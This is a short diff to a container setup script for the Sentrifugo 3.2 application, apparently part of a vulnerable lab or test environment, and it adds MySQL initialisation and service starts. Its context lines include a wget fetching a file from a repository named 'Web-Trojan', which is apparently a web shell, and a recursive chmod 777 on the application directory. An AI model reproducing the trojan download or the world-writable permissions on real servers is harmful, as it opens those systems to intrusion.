@@ -10,4 +10,7 @@ wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/success.php 
 service apache2 start
 chmod -R 777 /app/Sentrifugo_3.2
 chmod  777 /app/Sentrifugo_3.2
+mysql_install_db > /dev/null 2>&1
+service mysql start
+service apache2 start
 bash /run.sh
